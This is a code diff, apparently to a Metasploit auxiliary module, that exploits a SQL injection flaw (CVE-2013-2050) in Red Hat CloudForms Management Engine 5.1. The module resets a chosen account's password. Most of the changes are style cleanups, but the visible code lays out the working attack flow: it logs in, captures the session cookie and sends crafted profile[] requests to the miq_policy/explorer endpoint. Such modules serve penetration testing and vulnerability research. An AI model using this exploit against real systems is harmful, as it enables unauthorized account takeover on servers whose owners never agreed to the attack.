@@ -1,39 +1,40 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
 require 'bcrypt'
 require 'digest'
 require 'openssl'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpClient
 
   def initialize
     super(
-      'Name'           => 'Red Hat CloudForms Management Engine 5.1 miq_policy/explorer SQL Injection',
-      'Description'    => %q{
+      'Name' => 'Red Hat CloudForms Management Engine 5.1 miq_policy/explorer SQL Injection',
+      'Description' => %q{
           This module exploits a SQL injection vulnerability in the "explorer"
         action of "miq_policy" controller of the Red Hat CloudForms Management
         Engine 5.1 (ManageIQ Enterprise Virtualization Manager 5.0 and earlier) by
         changing the password of the target account to the specified password.
       },
-      'Author'         => 'Ramon de C Valle',
-      'License'        => MSF_LICENSE,
-      'References'     =>
-        [
-          ['CVE', '2013-2050'],
-          ['CWE', '89'],
-          ['URL', 'https://bugzilla.redhat.com/show_bug.cgi?id=959062']
-        ],
-      'DefaultOptions' =>
-        {
-          'SSL' => true
-        },
-      'DisclosureDate' => 'Nov 12 2013'
+      'Author' => 'Ramon de C Valle',
+      'License' => MSF_LICENSE,
+      'References' => [
+        ['CVE', '2013-2050'],
+        ['CWE', '89'],
+        ['URL', 'https://bugzilla.redhat.com/show_bug.cgi?id=959062']
+      ],
+      'DefaultOptions' => {
+        'SSL' => true
+      },
+      'DisclosureDate' => 'Nov 12 2013',
+      'Notes' => {
+        'Stability' => [CRASH_SAFE],
+        'SideEffects' => [IOC_IN_LOGS, CONFIG_CHANGES],
+        'Reliability' => []
+      }
     )
 
     register_options(
@@ -45,7 +46,7 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('TARGETPASSWORD', [true, 'The password of the target account', 'smartvm']),
         OptString.new('TARGETURI', [ true, 'The path to the application', '/']),
         OptEnum.new('HTTP_METHOD', [true, 'HTTP Method', 'POST', ['GET', 'POST'] ])
-      ], self.class
+      ]
     )
   end
 
@@ -72,10 +73,10 @@ class MetasploitModule < Msf::Auxiliary
   def password_reset?
     print_status("Trying to log into #{target_url('dashboard')} using the target account...")
     res = send_request_cgi(
-      'method'    => 'POST',
-      'uri'       => normalize_uri(target_uri.path, 'dashboard', 'authenticate'),
+      'method' => 'POST',
+      'uri' => normalize_uri(target_uri.path, 'dashboard', 'authenticate'),
       'vars_post' => {
-        'user_name'     => datastore['TARGETUSERNAME'],
+        'user_name' => datastore['TARGETUSERNAME'],
         'user_password' => datastore['TARGETPASSWORD']
       }
     )
@@ -86,7 +87,7 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     if res.body =~ /"Error: (.*)"/
-      print_error($1)
+      print_error(::Regexp.last_match(1))
       false
     else
       true
@@ -96,10 +97,10 @@ class MetasploitModule < Msf::Auxiliary
   def run
     print_status("Logging into #{target_url('dashboard')}...")
     res = send_request_cgi(
-      'method'    => 'POST',
-      'uri'       => normalize_uri(target_uri.path, 'dashboard', 'authenticate'),
+      'method' => 'POST',
+      'uri' => normalize_uri(target_uri.path, 'dashboard', 'authenticate'),
       'vars_post' => {
-        'user_name'     => datastore['USERNAME'],
+        'user_name' => datastore['USERNAME'],
         'user_password' => datastore['PASSWORD']
       }
     )
@@ -110,10 +111,10 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     if res.body =~ /"Error: (.*)"/
-      print_error($1)
+      print_error(::Regexp.last_match(1))
       return
     else
-      session = $1 if res.get_cookies =~ /_vmdb_session=(\h*)/
+      session = ::Regexp.last_match(1) if res.get_cookies =~ /_vmdb_session=(\h*)/
 
       if session.nil?
         print_error('Failed to retrieve the current session id')
@@ -124,9 +125,9 @@ class MetasploitModule < Msf::Auxiliary
     # Newer versions don't accept POST requests.
     print_status("Sending password-reset request to #{target_url('miq_policy', 'explorer')}...")
     send_request_cgi(
-      'cookie'   => "_vmdb_session=#{session}",
-      'method'   => 'GET',
-      'uri'      => normalize_uri(target_uri.path, 'miq_policy', 'explorer'),
+      'cookie' => "_vmdb_session=#{session}",
+      'method' => 'GET',
+      'uri' => normalize_uri(target_uri.path, 'miq_policy', 'explorer'),
       'vars_get' => {
         'profile[]' => value_for_newer_schema
       }
@@ -143,7 +144,7 @@ class MetasploitModule < Msf::Auxiliary
     send_request_cgi(
       'cookie' => "_vmdb_session=#{session}",
       'method' => datastore['HTTP_METHOD'],
-      'uri'    => normalize_uri(target_uri.path, 'miq_policy', 'explorer'),
+      'uri' => normalize_uri(target_uri.path, 'miq_policy', 'explorer'),
       "vars_#{datastore['HTTP_METHOD'].downcase}" => {
         'profile[]' => value_for_older_schema
       }
